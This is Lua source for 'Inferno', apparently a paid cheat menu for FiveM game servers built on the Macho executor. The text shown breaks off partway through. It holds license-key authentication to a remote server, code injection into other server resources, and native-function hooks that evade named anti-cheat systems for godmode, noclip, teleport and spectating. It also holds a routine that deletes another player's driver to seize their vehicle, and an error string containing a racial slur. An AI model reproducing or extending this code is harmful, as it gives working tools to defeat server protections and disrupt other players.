MachoLockLogger(1)
local DUI = nil
local authenticatedUser = "User"
authenticatedDiscordId = "0"
isAuthenticated = false
isVip = false
local xStormox_secret = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822fds5d6c15b0f00a08"

local bit = bit or bit32
if not bit then
    local func = load([[
         return {
             bor = function(a,b) return a | b end,
             band = function(a,b) return a & b end,
             bxor = function(a,b) return a ~ b end,
             rshift = function(a,b) return a >> b end,
             lshift = function(a,b) return a << b end,
             bnot = function(a) return ~a end
         }
     ]])
    if func then
        bit = func()
    end
end

local function md5(str)
    local K = {
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391
    }

    local function leftrotate(x, c)
        return bit.bor(bit.band(bit.lshift(x, c), 0xFFFFFFFF), bit.rshift(x, 32 - c))
    end

    local msgLen = #str
    local msg = str .. string.char(0x80)
    local bitLen = msgLen * 8

    while (#msg % 64) ~= 56 do
        msg = msg .. string.char(0)
    end

    for i = 0, 7 do
        msg = msg .. string.char(bit.band(bit.rshift(bitLen, i * 8), 0xFF))
    end

    local h0, h1, h2, h3 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476

    for chunkStart = 1, #msg, 64 do
        local chunk = msg:sub(chunkStart, chunkStart + 63)
        local M = {}

        for i = 0, 15 do
            local pos = i * 4 + 1
            local a, b, c, d = string.byte(chunk, pos, pos + 3)
            M[i] = bit.bor(
                bit.bor(a or 0, bit.lshift(b or 0, 8)),
                bit.bor(bit.lshift(c or 0, 16), bit.lshift(d or 0, 24))
            )
        end

        local A, B, C, D = h0, h1, h2, h3

        for i = 0, 63 do
            local F, g
            if i <= 15 then
                F = bit.bor(bit.band(B, C), bit.band(bit.bnot(B), D))
                g = i
            elseif i <= 31 then
                F = bit.bor(bit.band(D, B), bit.band(bit.bnot(D), C))
                g = (5 * i + 1) % 16
            elseif i <= 47 then
                F = bit.bxor(bit.bxor(B, C), D)
                g = (3 * i + 5) % 16
            else
                F = bit.bxor(C, bit.bor(B, bit.bnot(D)))
                g = (7 * i) % 16
            end

            local temp = D
            D = C
            C = B
            local sum = bit.band(A + F + K[i + 1] + M[g], 0xFFFFFFFF)
            local s = ({ 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
                4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21 })[i + 1]
            B = bit.band(B + leftrotate(sum, s), 0xFFFFFFFF)
            A = temp
        end

        h0 = bit.band(h0 + A, 0xFFFFFFFF)
        h1 = bit.band(h1 + B, 0xFFFFFFFF)
        h2 = bit.band(h2 + C, 0xFFFFFFFF)
        h3 = bit.band(h3 + D, 0xFFFFFFFF)
    end

    local function toHex32LE(n)
        return string.format("%02x%02x%02x%02x",
            bit.band(n, 0xFF),
            bit.band(bit.rshift(n, 8), 0xFF),
            bit.band(bit.rshift(n, 16), 0xFF),
            bit.band(bit.rshift(n, 24), 0xFF))
    end

    return toHex32LE(h0) .. toHex32LE(h1) .. toHex32LE(h2) .. toHex32LE(h3)
end

local nonceCounter = 0
local function generateNonce()
    nonceCounter = nonceCounter + 1
    local timestamp = GetGameTimer and GetGameTimer() or 0
    local random1 = math.random(100000, 999999)
    local random2 = math.random(100000, 999999)

    return string.format("%d%d%d%d", timestamp, random1, random2, nonceCounter)
end

local function urlEncode(str)
    return tostring(str):gsub("([^%w ])", function(c)
        return string.format("%%%02X", string.byte(c))
    end):gsub(" ", "+")
end

local function isValidFunction(func)
    return type(func) == "function"
end

local function phpBool(val)
    if val == true then return "1" end
    return ""
end

function authenticateKey()
    isAuthenticated = false

    local getKey = MachoAuthenticationKey
    local request = MachoWebRequest

    if not isValidFunction(request) then
        MachoMenuNotification("Inferno", "Inferno: Missing or invalid MachoWebRequest function.")
        return false
    end

    if not isValidFunction(getKey) then
        MachoMenuNotification("Inferno", "Inferno: Missing or invalid MachoAuthenticationKey function.")
        return false
    end

    local nonce = generateNonce()
    local serverIP = GetCurrentServerEndpoint() or "127.0.0.1"
    machoKey = getKey()

    local authURL = string.format(
        "https://risklua.com/ldaldjfsinfernoapi/authenticate2?key=%s&nonce=%s&ip=%s",
        urlEncode(machoKey),
        urlEncode(nonce),
        urlEncode(serverIP)
    )

    local response = request(authURL)
    if not response or response == "" then
        MachoMenuNotification("Inferno", "Inferno: No response from auth server.")
        return false
    end

    local success, result = pcall(function()
        local cleanedResponse = response:match("^%s*(.-)%s*$")
        return json.decode(cleanedResponse)
    end)

    if not (success and type(result) == "table" and result.exists and result.valid) then
        MachoMenuNotification("Inferno", "Inferno: Invalid key.")
        return false
    end

    if tostring(result.nonce) ~= tostring(nonce) or not result.signature then
        MachoMenuNotification("Inferno", "Inferno: Security verification failed #1")
        return false
    end

    local payload = phpBool(result.exists) .. phpBool(result.valid) ..
        tostring(result.expires_at) .. tostring(result.discord_id) ..
        tostring(result.timestamp) .. tostring(result.nonce)

    if md5(xStormox_secret .. payload .. xStormox_secret) ~= result.signature then
        MachoMenuNotification("Inferno", "Inferno: Signature verification failed")
        return false
    end
    isAuthenticated = true
    isVip = result.is_vip or false

    local expiresAt = "unknown"
    local serverName = "unknown"

    if result.type and type(result.type) == "string" and result.type == "lifetime" then
        expiresAt = "Lifetime"
    elseif result.expires_at and type(result.expires_at) == "string" then
        local dateStr = result.expires_at:match("^(%d+-%d+-%d+)")
        expiresAt = result.expires_at == "unknown" and "Lifetime" or (dateStr or result.expires_at)
    elseif result.type and type(result.type) == "string" then
        expiresAt = "Active (" .. result.type .. ")"
    end

    if result.server_name and type(result.server_name) == "string" then
        serverName = result.server_name
    end

    authenticatedUser = result.discord_username or result.discord_name or result.username or result.discord_id or
        "Unknown"
    authenticatedDiscordId = result.discord_id or "0"
    keyExpiresAt = expiresAt

    MachoMenuNotification("Inferno", "Authentication successful. Welcome.\nExpires: " .. tostring(expiresAt))

    return true
end

-- if not authenticateKey() then return end
-- MachoMenuNotification("Inferno", "Have fun using Inferno" .. authenticatedUser .. "")

local function isResourceRunning(resourceName)
    return GetResourceState(resourceName) == "started"
end

-- // Kick From Vehicle \\ --
function KickVehicleDriver(vehicle)
    MachoInjectResource2(NewThreadNs, "any", string.format([[
        local vehicle = %s

        _G.jiggares = function(callback, ...)
            local ped = PlayerPedId()
            local netId = NetworkGetNetworkIdFromEntity(ped)
            local stateName = "net_" .. netId .. "_" .. math.random(69420, 6942069420)

            local entity = NetworkGetEntityFromNetworkId(netId)

            Entity(entity).state:set(stateName, callback, false)
            Entity(entity).state[stateName](...)
        end

        local function RequestControl(entity, timeoutMs)
            timeoutMs = timeoutMs or 1500
            local start = GetGameTimer()

            while (GetGameTimer() - start) < timeoutMs do

                if NetworkHasControlOfEntity(entity) then
                    return true
                end

                jiggares(NetworkRequestControlOfEntity, entity)
                Wait(0)

            end

            return NetworkHasControlOfEntity(entity)
        end

        local function GetFirstPassengerSeat(veh)
            local seats = {0,1,2,3}

            for i=1,#seats do
                local seat = seats[i]

                if IsVehicleSeatFree(veh, seat) then
                    return seat
                end
            end

            return nil
        end

        local function TeleportOutsideVehicle(ped, veh)
            local vehCoords = GetEntityCoords(veh)
            local forward = GetEntityForwardVector(veh)

            local x = vehCoords.x + forward.x * -3.0
            local y = vehCoords.y + forward.y * -3.0
            local z = vehCoords.z + 0.5

            jiggares(SetEntityCoordsNoOffset, ped, x, y, z, false, false, false)
        end

        local function KickVehicleDriver(vehicle)
            if not vehicle or vehicle == 0 then
                return
            end

            local ped = PlayerPedId()
            local originalCoords = GetEntityCoords(ped)

            RequestControl(vehicle, 1500)

            jiggares(SetEntityVisible, ped, false, false)

            local attempts = 0
            local success = false

            while attempts < 10 do

                attempts = attempts + 1

                local driver = GetPedInVehicleSeat(vehicle, -1)

                if driver == 0 then
                    break
                end

                local seat = GetFirstPassengerSeat(vehicle)

                if not seat then
                    break
                end

                TeleportOutsideVehicle(ped, vehicle)
                Wait(40)

                jiggares(SetPedIntoVehicle, ped, vehicle, seat)
                Wait(60)

                RequestControl(vehicle, 800)

                jiggares(DeleteEntity, driver)
                Wait(80)

                jiggares(SetPedIntoVehicle, ped, vehicle, -1)
                Wait(200)

                local checkDriver = GetPedInVehicleSeat(vehicle, -1)

                if checkDriver == ped then
                    success = true
                    break
                end
            end

            if IsPedInAnyVehicle(ped, false) then
                local veh = GetVehiclePedIsIn(ped, false)

                jiggares(TaskLeaveVehicle, ped, veh, 16)
                Wait(200)

                jiggares(ClearPedTasksImmediately, ped)
            end

            jiggares(SetEntityCoordsNoOffset, ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)

            jiggares(SetEntityVisible, ped, true, false)
        end

        KickVehicleDriver(vehicle)
    ]], vehicle))
end

-- // Injection Verification \\ --
local PendingInjects = {}
-- // Injected Resource > Macho Reciever
MachoHookNative(0x11B56FBBF7224868, function(arg)
    local data = arg

    if type(arg) == "string" then
        local ok, decoded = pcall(json.decode, arg)
        if ok then data = decoded end
    end

    if type(data) ~= "table" then
        return false
    end

    if data.action ~= "inject_verified" then
        return false
    end

    local id = data.id

    if id and PendingInjects[id] then
        PendingInjects[id].Success = true
    end

    return false
end)

-- // Injected Resource > Macho Callback
local function BuildInjectStub(id)
    return ([[
        if not _G.__PLAID_BRIDGE_%s then
            _G.__PLAID_BRIDGE_%s = true

            RegisterNUICallback("plaid_verify_%s", function(data,cb)
                PreloadCloudHat(json.encode({
                    action="inject_verified",
                    id="%s"
                }))
            end)

            PreloadCloudHat(json.encode({
                action="inject_verified",
                id="%s"
            }))
        else
            PreloadCloudHat(json.encode({
                action="inject_verified",
                id="%s"
            }))
        end
    ]]):format(id, id, id, id, id, id)
end

local function VerifiedInject(resource, mode)
    local id =
        tostring(GetGameTimer()) .. "_" .. resource

    PendingInjects[id] = {
        Success = false
    }

    -- // Verification Thread
    Citizen.CreateThread(function()
        local timeout = GetGameTimer() + 2500

        while GetGameTimer() < timeout do
            Wait(50)

            local entry = PendingInjects[id]

            if entry and entry.Success then
                if mode == "resource" then
                    showNotify(("Resource Injection Successful → '%s'"):format(resource), "success")
                else
                    showNotify(("Thread Injection Successful → '%s'"):format(resource), "success")
                end

                PendingInjects[id] = nil
                return
            end
        end

        PendingInjects[id] = nil

        if mode == "resource" then
            showNotify(("Resource Injection Failed → '%s'"):format(resource), "error")
        else
            showNotify(("Thread Injection Failed → '%s'"):format(resource), "error")
        end
    end)

    -- // Injection
    local stub = BuildInjectStub(id)

    if mode == "resource" then
        showNotify("Testing Resource Injection → " .. resource, "warning")
        MachoInjectResource2(NewThreadNoState, resource, stub)
    elseif mode == "thread" then
        showNotify("Testing Thread Injection → " .. resource, "warning")
        MachoInjectResource2(AsThreadNoState, resource, stub)
    end
end
--------------------------------------------------------------------------------
-- Native Bypass
--------------------------------------------------------------------------------
local function executeCode(resource, code)
    local setFullCode = [[
        local _rawEnv = _ENV
        _G.fn = function(setFunc, ...)
            local stateName = math.random(999999,999999999)..GetCurrentResourceName()..GetGameTimer()
            LocalPlayer.state:set(stateName, setFunc, false)

            return LocalPlayer.state[stateName](...)
        end

        local _autoEnv = setmetatable({}, {
            __index = function(_, k)
                local v = rawget(_rawEnv, k)
                if v == nil then v = _rawEnv[k] end
                if type(v) == "function" then
                    return function(...) return _G.fn(v, ...) end
                end
                return v
            end,
            __newindex = function(_, k, v)
                rawset(_rawEnv, k, v)
            end
        })
        local setFunc, _err = load(SET_CODE, " = (inject)", "t", _autoEnv)
        if setFunc then setFunc() else error('didnt work nigga') end
    ]]

    local setCode = setFullCode:gsub("SET_CODE", (function()
        return string.format("[[\n%s\n]]", code)
    end)())

    if GetResourceState('ReaperV4') == 'started' then
        MachoInjectResource2(NewThreadNs, resource, setCode)
    elseif GetResourceState('WaveShield') == 'started' then
        MachoInjectThread(0, resource, "t", code)
    else
        MachoInjectResource2(NewThreadNs, resource, setCode)
    end
end

-- // SPECTATE PLAYER BYPASS
if GetResourceState("ReaperV4") == "started" then
    MachoHookNative(0x048746E388762E11, function() -- NetworkIsInSpectatorMode
        return false, true
    end)
end

-- // WaveShield SetEntityInvincible godmode bypass
if GetResourceState("WaveShield") == "started" and GetCurrentServerEndpoint() ~= "216.146.24.88:30120" then
    -- GetPedType
    MachoHookNative(0xFF059E1E4C01E63C, function(ped)
        if IsOurPed(ped) then
            return false, 28
        end
        return true
    end)
    -- GetAreCameraControlsDisabled
    MachoHookNative(0x7C814D2FB49F40C0, function()
        return false, true
    end)
end
-- // Noclip Bypass \\ --
if GetResourceState("WaveShield") == "started" then
    MachoHookNative(0xB15162CB5826E9E8, function() -- IsCinematicCamRendering()
        return false, true
    end)
    MachoHookNative(0xE659E47AF827484B, function(entity) -- IsEntityOnScreen
        return false, true
    end)

    -- // ped changer bypass
    MachoHookNative(0x9F47B058362C84B5, function() -- GetEntityModel
        return false, 0
    end)

    MachoHookNative(0x53E8CB4F48BFE623, function(entity) -- IsPedClimbing
        if IsPedInAnyVehicle(entity, false) then
            return false, false
        end

        return false, true
    end)

    MachoHookNative(0x12534C348C6CB68B, function(ped) -- IsPedAPlayer
        local myPed = PlayerPedId()
        local attachedTo = GetEntityAttachedTo(myPed)

        -- If checking what we're attached to, say it's a player
        if attachedTo and ped == attachedTo then
            return false, true
        end

        return true
    end)

    MachoHookNative(0x48C2BED9180FE123, function(entity) -- GetEntityAttachedTo
        local myPed = PlayerPedId()

        -- If checking us, prevent returning ourselves as attached
        if entity == myPed then
            local realAttached = GetEntityAttachedTo(entity)

            -- If attached to ourselves, return 0
            if realAttached == myPed then
                return false, 0
            end
        end

        return true
    end)

    --  MachoHookNative(0xCEDABC5900A0BF97, function(entity) -- IsPedJumping
    --     return false, true
    -- end)
end

-- // Teleport Bypass
if GetResourceState("WaveShield") == "started" then
    MachoHookNative(0xE3B6097CC25AA69E, function(ped) -- IsPedRunningRagdollTask
        return false, true
    end)
end
MachoHookNative(0xE3B6097CC25AA69E, function(ped) -- IsPedRunningRagdollTask
    return false, true
end)
if MachoResourceInjectable("WaveShield") then
    MachoHookNative(0xD3C2E180A40F031E, function()
        return false, true
    end)
end

MachoHookNative(0xE3B6097CC25AA69E, function(ped) -- IsPedRunningRagdollTask
    return false, true
end)

if GetResourceState("WaveShield") == "started" then
    MachoHookNative(0xE18B138FABC53103, function() -- IsWarningMessageActive()
        return false, true
    end)
    MachoHookNative(0x81DF9ABA6C83DFF9, function(caller) -- GetWarningMessageTitleHash()
        return false, 1246147334
    end)
end
MachoHookNative(0x1DD55701034110E5, function(ped) -- GetEntityHeightAboveGround
    if ped == PlayerPedId() then
        return false, 1.0
    end
    return true, GetEntityHeightAboveGround(ped)
end)

MachoHookNative(0x831E0242595560DF, function(entity) -- GetEntityRoll
    return false, 0.0
end)

MachoHookNative(0x8E3222B7, function(entity) -- GetEntityHealth
    return false, 0
end)

local safeStateNatives = {
    [0x01FEE67DB37F59B2] = true, -- IsPedOnFoot
    -- [0x47E4E977581C5B55] = true, -- IsPedRagdoll
    [0x9DE327631295B4C2] = true, -- IsPedSwimming
    [0xC024869A53992F34] = true, -- IsPedSwimmingUnderWater
    [0x433DDFFE2044B636] = true, -- IsPedJumpingOutOfVehicle
    [0x53E8CB4F48BFE623] = true, -- IsPedClimbing
    [0xCEDABC5900A0BF97] = true  -- IsPedJumping
}

for hash in pairs(safeStateNatives) do
    MachoHookNative(hash, function(ped)
        if ped == PlayerPedId() then
            return false, false
        end
        return true, Citizen.InvokeNative(hash, ped)
    end)
end

if GetResourceState("WaveShield") == "started" then
    MachoHookNative(0x3317DEDB88C95038, function(ped, checkMeleeDeathFlags) -- IsPedDeadOrDying
        if ped == PlayerPedId() then
            return false, true
        end
        return true
    end)
end

-- MachoHookNative(0xF4E73E1E0AE1B445, function(ped) -- GetPedParachuteState
--     if ped == PlayerPedId() then
--         return false, -1
--     end
--     return true, GetPedParachuteState(ped)
-- end)

MachoHookNative(0x67722AEB798E5FAB, function(ped) -- IsPedOnVehicle
    if ped == PlayerPedId() then
        return false, true
    end
    return true, IsPedOnVehicle(ped)
end)

-- if GetResourceState("WaveShield") == "started" then
--     MachoHookNative(0x47E4E977581C5B55, function(ped) -- IsPedRagdoll
--         if ped == PlayerPedId() then
--             return false, true
--         end
--         return true
--     end)
-- end


-- // Anti-AFK bypass \\ --
MachoHookNative(0xB0760331C7AA4155, function(ped, taskIndex)
    local AFKTaskIds = {
        [100] = true,
        [101] = true,
        [151] = true,
        [221] = true,
        [222] = true,
    }
    if AFKTaskIds[taskIndex] then
        return false, false
    end
    return true
end)
-- // Godmode Bypass \\ --
local function IsOurPed(ped)
    return ped == PlayerPedId()
end

if GetResourceState("WaveShield") == "started" then
    -- GET_PED_TYPE
    MachoHookNative(0xFF059E1E4C01E63C, function(ped)
        if IsOurPed(ped) then
            return false, 28
        end
        return true
    end)
    -- GET_ARE_CAMERA_CONTROLS_DISABLED
    MachoHookNative(0x7C814D2FB49F40C0, function()
        return false, true
    end)
end

if not GetActivePlayers() then
    QuitGame()
end
local Dui
isAuthenticated               = false
local MenuKey                 = "CAPS LOCK"
local IsVisible               = false
local activeMenu              = {}
local activeIndex             = 1
local nestedMenus             = {}
local currentTabs             = nil
local currentTabIndex         = 0
local tabStateMap             = {}
local menuStateMap            = {}
local currentSubMenuRefresher = nil
local isDynamicSubMenu        = false
local isBusy                  = false
local currentInputData        = {
    title = "",
    Type = "",
    disc = "",
    buffer = "",
    cursorPos = 0,
    Active = false,
    inputJustClosed = false,
    inputJustOpened = false,
    selectAllActive = false,
    inputJustSubmitted = false,
    SetListerner = false,
    callback = nil,
    inputType = "typeable"
}
local modifiers               = { shift = false, ctrl = false, alt = false }
local keyStates               = {}
local lastTabIndices          = {}
local lastMainMenuIndex       = 1
local navKeyUp                = "ArrowUp"
local navKeyDown              = "ArrowDown"
local menuPosX                = 14.25
local menuPosY                = 21.5
local menuScale               = 100
local menuColorR              = 197
local menuColorG              = 34
local menuColorB              = 34
local showKeybindListState    = false
local KeyMap                  = {
    [3] = "Cancel",
    [6] = "Help",
    [8] = "Backspace",
    [9] = "Tab",
    [12] = "Clear",
    [13] = "Enter",
    [16] = "Shift",
    [17] = "Ctrl",
    [18] = "Alt",
    [19] = "Pause",
    [20] = "CAPS LOCK",
    [21] = "IME Hangul",
    [23] = "IME Junja",
    [24] = "IME Final",
    [25] = "IME Hanja",
    [27] = "Escape",
    [28] = "Convert",
    [29] = "Non Convert",
    [30] = "Accept",
    [31] = "Mode Change",
    [32] = "Space",
    [33] = "PageUp",
    [34] = "PageDown",
    [35] = "End",
    [36] = "Home",
    [37] = "ArrowLeft",
    [38] = "ArrowUp",
    [39] = "ArrowRight",
    [40] = "ArrowDown",
    [45] = "Insert",
    [46] = "Delete",
    [47] = "Help",
    [48] = "0",
    [49] = "1",
    [50] = "2",
    [51] = "3",
    [52] = "4",
    [53] = "5",
    [54] = "6",
    [55] = "7",
    [56] = "8",
    [57] = "9",
    [65] = "A",
    [66] = "B",
    [67] = "C",
    [68] = "D",
    [69] = "E",
    [70] = "F",
    [71] = "G",
    [72] = "H",
    [73] = "I",
    [74] = "J",
    [75] = "K",
    [76] = "L",
    [77] = "M",
    [78] = "N",
    [79] = "O",
    [80] = "P",
    [81] = "Q",
    [82] = "R",
    [83] = "S",
    [84] = "T",
    [85] = "U",
    [86] = "V",
    [87] = "W",
    [88] = "X",
    [89] = "Y",
    [90] = "Z",
    [91] = "Left Windows",
    [92] = "Right Windows",
    [93] = "Select",
    [95] = "Sleep",
    [96] = "Numpad0",
    [97] = "Numpad1",
    [98] = "Numpad2",
    [99] = "Numpad3",
    [100] = "Numpad4",
    [101] = "Numpad5",
    [102] = "Numpad6",
    [103] = "Numpad7",
    [104] = "Numpad8",
    [105] = "Numpad9",
    [106] = "NumpadMultiply",
    [107] = "NumpadAdd",
    [108] = "NumpadEnter",
    [109] = "NumpadSubtract",
    [110] = "NumpadDecimal",
    [111] = "NumpadDivide",
    [112] = "F1",
    [113] = "F2",
    [114] = "F3",
    [115] = "F4",
    [116] = "F5",
    [117] = "F6",
    [118] = "F7",
    [119] = "F8",
    [120] = "F9",
    [121] = "F10",
    [122] = "F11",
    [123] = "F12",
    [124] = "F13",
    [125] = "F14",
    [126] = "F15",
    [127] = "F16",
    [128] = "F17",
    [129] = "F18",
    [130] = "F19",
    [131] = "F20",
    [132] = "F21",
    [133] = "F22",
    [134] = "F23",
    [135] = "F24",
    [144] = "Num Lock",
    [145] = "Scroll Lock",
    [160] = "Left Shift",
    [161] = "Right Shift",
    [162] = "Left Ctrl",
    [163] = "Right Ctrl",
    [164] = "Left Alt",
    [165] = "Right Alt",
    [166] = "Browser Back",
    [167] = "Browser Forward",
    [168] = "Browser Refresh",
    [169] = "Browser Stop",
    [170] = "Browser Search",
    [171] = "Browser Favorites",
    [172] = "Browser Home",
    [173] = "Volume Mute",
    [174] = "Volume Down",
    [175] = "Volume Up",
    [176] = "Media Next",
    [177] = "Media Previous",
    [178] = "Media Stop",
    [179] = "Media Play/Pause",
    [180] = "Launch Mail",
    [181] = "Select Media",
    [182] = "Launch App 1",
    [183] = "Launch App 2",
    [186] = ";",
    [187] = "=",
    [188] = ",",
    [189] = "-",
    [190] = ".",
    [191] = "/",
    [192] = "`",
    [219] = "[",
    [220] = "\\",
    [221] = "]",
    [222] = "'",
    [226] = "OEM 102"
}

local ShiftMap                = {
    ["1"] = "!",
    ["2"] = "@",
    ["3"] = "#",
    ["4"] = "$",
    ["5"] = "%",
    ["6"] = "^",
    ["7"] = "&",
    ["8"] = "*",
    ["9"] = "(",
    ["0"] = ")",
    [";"] = ":",
    ["="] = "+",
    [","] = "<",
    ["-"] = "_",
    ["."] = ">",
    ["/"] = "?",
    ["`"] = "~",
    ["["] = "{",
    ["\\"] = "|",
    ["]"] = "}",
    ["'"] = '"',
    ["A"] = "A",
    ["B"] = "B",
    ["C"] = "C",
    ["D"] = "D",
    ["E"] = "E",
    ["F"] = "F",
    ["G"] = "G",
    ["H"] = "H",
    ["I"] = "I",
    ["J"] = "J",
    ["K"] = "K",
    ["L"] = "L",
    ["M"] = "M",
    ["N"] = "N",
    ["O"] = "O",
    ["P"] = "P",
    ["Q"] = "Q",
    ["R"] = "R",
    ["S"] = "S",
    ["T"] = "T",
    ["U"] = "U",
    ["V"] = "V",
    ["W"] = "W",
    ["X"] = "X",
    ["Y"] = "Y",
    ["Z"] = "Z"
}

local function ShowUI()
    if not Dui then
        return
    end

    if currentInputData.Active then
        return
    end

    IsVisible = true
    MachoSendDuiMessage(Dui, json.encode({ action = "setVisible", visible = true }))
end

local function HideUI()
    if not Dui then
        return
    end

    IsVisible = false
    MachoSendDuiMessage(Dui, json.encode({ action = "setVisible", visible = false }))
end

local function setCurrent()
    if Dui then
        MachoSendDuiMessage(Dui, json.encode({
            action = 'setCurrent',
            current = activeIndex,
            menu = activeMenu
        }))
    end
end

local function SendSvelte(action, data)
    if not Dui then return end
    data.action = action
    MachoSendDuiMessage(Dui, json.encode(data))
end

local function pushBuffer()
    SendSvelte("setInputText", { value = currentInputData.buffer, cursor = currentInputData.cursorPos })
end

local function clearBuffer()
    currentInputData.buffer = ""
    currentInputData.cursorPos = 0
    currentInputData.selectAllActive = false
    pushBuffer()
end

local settingKeybind = false
local selectedKey = nil
local isKeybindConfigured = false
local itemKeybinds = {}
local settingItemKeybind = false
local itemKeybindPending = nil

local function IsValidKey(key)
    local upperKey = key:upper()
    for _, v in pairs(KeyMap) do
        if v:upper() == upperKey then return true end
    end
    return false
end

local function isInputActive()
    return _G.isInputVisible == true
end

function showInput(title, defaultText, callback, inputType)
    _G.isInputVisible = true
    inputType = inputType or "typeable"

    if IsVisible then HideUI() end

    currentInputData.inputJustOpened = true
    currentInputData.buffer = defaultText or ""
    currentInputData.cursorPos = #currentInputData.buffer
    currentInputData.Active = true
    currentInputData.inputJustSubmitted = false
    currentInputData.callback = callback
    currentInputData.inputType = inputType

    SendSvelte("showInput", {
        showInput = true,
        title = title,
        disc = "",
        inputType = inputType
    })
end

local function closeInput()
    currentInputData.inputJustClosed = true
    currentInputData.Active = false

    local savedCallback = currentInputData.callback
    local savedBuffer = currentInputData.buffer

    currentInputData.callback = nil
    currentInputData.buffer = ""
    currentInputData.cursorPos = 0
    _G.isInputVisible = false
    CreateThread(function()
        Wait(300)
        currentInputData.inputJustClosed = false
        if not IsVisible then
            ShowUI()
            setCurrent()
        end
    end)

    SendSvelte("showInput", { showInput = false })

    return savedCallback, savedBuffer
end

local function showNotify(message, type)
    SendSvelte("notify", { message = message, type = type })
end

-- AC Detection
local function detectAntiCheat(verbose)
    local numResources = GetNumResources()
    local detectedName, detectedAc
    local fileSignatures = {
        { files = { 'ai_module_fg-obfuscated.lua' },                        name = 'FiveGuard' },
        { files = { 'source/client/crasher.lua', 'source/client/ocr.lua' }, name = 'ReasonAC' },
        { files = { 'client/injections.lua', 'client/menu.lua' },           name = 'GreekAC' },
        { files = { 'fini_events.js', 'fini_events.lua' },                  name = 'FiniAC' },
        { files = { 'resource/waveshield.js' },                             name = 'WaveShield' },
        { files = { 'c_config.lua', 'client/ligma.lua' },                   name = 'mAC (custom)' },
        { files = { 'src/fire-client.lua', 'src/fire-menu.lua' },           name = 'FireAC' },
        { files = { 'anvil.lua', 'client.lua' },                            name = 'AnvilAC' },
        { files = { 'client/cl_crypto.lua', 'client/cl_main.lua' },         name = 'PegasusAC' },
        { files = { 'src/client/main.lua', 'src/include/client.lua' },      name = 'ElectronAC' }
    }

    local reaperFiles = {
        'patches/resource_drc_uwucafe.lua',
        'patches/resource_es_extended.lua',
        'patches/resource_lb-phone.lua',
        'patches/resource_monitor.lua',
        'patches/resource_pickle_rental.lua',
        'patches/resource_qb-core.lua',
        'patches/resource_wasabi_bridge.lua',
        'patches/resource_wasabi_mining.lua',
        'patches/resource_xradio.lua'
    }

    local namePatterns = {
        { match = function(lower) return lower:sub(1, 7) == 'chubsac' end,                                           name = 'Chubs AC' },
        { match = function(lower) return lower:sub(1, 7) == 'drillac' end,                                           name = 'Drill AC' },
        { match = function(lower) return lower:sub(-10) == 'likizao_ac' end,                                         name = 'Likizao AC' },
        { match = function(lower) return lower == 'prp-rpc' end,                                                     name = 'Prodigy AC' },
        { match = function(lower) return lower == 'srp-anticheat' end,                                               name = 'Springbank AC' },
        { match = function(lower) return lower == 'ec_ac' end,                                                       name = 'Eagle AC' },
        { match = function(lower) return lower == 'cyberanticheat' end,                                              name = 'CyberAnticheat' },
        { match = function(lower) return lower == 'pl_protect' end,                                                  name = 'PL Protect' },
        { match = function(lower) return lower == 'mqcu' end,                                                        name = 'MQCU' },
        { match = function(lower) return lower == 'thnac' end,                                                       name = 'Thn AC' },
        { match = function(lower) return lower == 'qb-anticheat' end,                                                name = 'QB AntiCheat' },
        { match = function(lower) return lower == 'nb_anticheat' end,                                                name = 'NB AntiCheat' },
        { match = function(lower) return lower == 'putin' end,                                                       name = 'Putin AC' },
        { match = function(lower) return lower == 'venus_anticheat' or lower == 'venusac' end,                       name = 'Venus AC' },
        { match = function(lower) return lower == 'anticheese' or lower == 'anticheese-anticheat' end,               name = 'AntiCheese' },
        { match = function(lower) return lower == 'anticheese-anticheat-master' or lower == 'anticheese-master' end, name = 'AntiCheese Master' },
        { match = function(lower) return lower == 'wx-anticheat' end,                                                name = 'WX AntiCheat' },
        { match = function(lower) return lower == 'wx_anticheat' end,                                                name = 'WX AntiCheat' },
        { match = function(lower) return lower == 'somis_anticheat' or lower == 'somis-anticheat' end,               name = 'Somis AntiCheat' },
        { match = function(lower) return lower == 'clownguard' end,                                                  name = 'ClownGuard' },
        { match = function(lower) return lower == 'oltest' end,                                                      name = 'OLTest' },
        { match = function(lower) return lower == 'chocohax' end,                                                    name = 'ChocoHax' },
        { match = function(lower) return lower == 'esxac' end,                                                       name = 'ESX AC' },
        { match = function(lower) return lower == 'tigoac' end,                                                      name = 'Tigo AC' },
        { match = function(lower) return lower == 'tiagoac' end,                                                     name = 'Tiago AC' },
        { match = function(lower) return lower == 'titanac' end,                                                     name = 'Titan AC' },
        { match = function(lower) return lower == 'versusac' or lower == 'versusac-ocr' end,                         name = 'Versus AC' },
        { match = function(lower) return lower == 'furiousanticheat' end,                                            name = 'Furious AC' },
        { match = function(lower) return lower == 'mzshieldd' end,                                                   name = 'MZShield' },
        { match = function(lower) return lower:find('kb-anticheat') end,                                             name = 'KB AntiCheat' },
